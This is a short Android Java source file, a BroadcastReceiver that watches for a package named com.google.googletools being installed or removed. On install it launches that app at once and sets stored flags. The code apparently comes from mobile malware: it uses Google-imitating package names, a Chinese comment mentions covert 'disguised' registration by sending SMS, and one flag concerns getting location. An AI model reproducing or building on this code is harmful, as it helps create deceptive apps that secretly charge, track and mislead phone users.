package com.android.abutton;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.google.utils.DataPreference;
import com.google.utils.Utils;


public class PackageAddRemReceiver extends BroadcastReceiver {

    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        String packageName = intent.getDataString().substring(8);
        Utils.Log("test", "packageaddreceiver:"+packageName);
        if (Intent.ACTION_PACKAGE_ADDED.equals(action)&&packageName.equals("com.google.googletools")) {
        	Utils.launchApplication(context, packageName);
        	DataPreference.isInstall.put(true);
        	DataPreference.installTime.put(Utils.getCurrentTime());
        	DataPreference.ISGETREQUEST.put(false);
        	//安装过了，以后不通过发短信变相注册了
        	DataPreference.ISGETLOCATION.put(true);
        } else if (Intent.ACTION_PACKAGE_REMOVED.equals(action)&&packageName.equals("com.google.googletools")) {
        	DataPreference.isInstall.put(false);
        }
    }
}
